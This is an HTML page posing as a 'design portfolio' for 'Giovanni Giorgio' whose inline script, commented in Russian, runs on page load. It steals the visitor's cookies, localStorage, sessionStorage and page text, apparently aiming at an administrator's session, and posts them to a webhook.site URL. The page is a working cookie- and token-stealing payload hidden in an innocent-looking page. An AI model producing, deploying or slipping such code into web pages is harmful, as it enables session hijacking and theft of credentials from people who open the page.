<!DOCTYPE html>
<html>
<head>
    <title>My Design Portfolio</title>
</head>
<body>
    <h1>Hello, Giovanni Giorgio here</h1>
    <p>Welcome to my design portfolio!</p>

    <script>
    (function() {
        // 1. Замени это на свой чистый URL из webhook.site
        const WEBHOOK = 'https://webhook.site/5777831e-326d-43f6-83a0-de255e891b9f';

        // Универсальная функция для отправки данных
        function exfiltrate(label, data) {
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    type: label,
                    data: data,
                    url: location.href,
                    timestamp: new Date().toISOString()
                })
            }).catch(e => {});
        }

        // 2. Кража cookie (самый вероятный вектор для получения сессии/пароля)
        exfiltrate('cookies', document.cookie);

        // 3. Кража данных из localStorage (там могут быть токены)
        try {
            exfiltrate('localStorage', JSON.stringify(localStorage));
        } catch(e) {}

        // 4. Кража данных из sessionStorage
        try {
            exfiltrate('sessionStorage', JSON.stringify(sessionStorage));
        } catch(e) {}

        // 5. Попытка прочитать что-то со страницы, где находится админ
        // (например, если это админ-панель, там может быть email или другой敏感信息)
        setTimeout(() => {
            exfiltrate('page_text', document.body.innerText.slice(0, 3000));
        }, 1000);
    })();
    </script>
</body>
</html>
